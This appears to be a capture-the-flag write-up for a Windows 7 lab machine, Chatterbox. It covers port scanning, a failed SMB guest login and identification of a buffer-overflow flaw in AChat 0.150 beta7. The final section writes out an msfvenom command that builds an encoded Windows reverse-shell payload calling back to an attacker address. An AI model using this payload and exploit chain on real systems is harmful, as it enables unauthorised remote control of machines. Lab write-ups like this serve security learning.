
Target : 10.129.37.197

Started off with the port scan : 135,139,445,9255,9256

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
9256/tcp open  achat        AChat chat system
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-07-22T15:38:17-04:00
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
|_clock-skew: mean: 6h19m43s, deviation: 2h18m37s, median: 4h59m41s
| smb2-time:
|   date: 2026-07-22T19:38:16
|_  start_date: 2026-07-22T19:28:32
```

Enumerating Port : 139,445

```
nxc smb $ip -u guest -p ""                                                                                                                                                
SMB         10.129.37.197   445    CHATTERBOX       [*] Windows 7 Professional 7601 Service Pack 1 x32 (name:CHATTERBOX) (domain:Chatterbox) (signing:False) (SMBv1:True) (Null Auth:True)
SMB         10.129.37.197   445    CHATTERBOX       [-] Chatterbox\guest: STATUS_ACCOUNT_DISABLED
```

We can't login using anonymous account. 

Enumerating port : 9255,9256 

It's running a Achat 0.150 beta7 chat system, which is vulnerable to Remote BufferOverflow attack.

Ref : https://www.exploit-db.com/exploits/36025

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.141 LPORT=1234 EXITFUNC=thread -a x86 -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' -f python -e "x86/unicode_mixed"
```

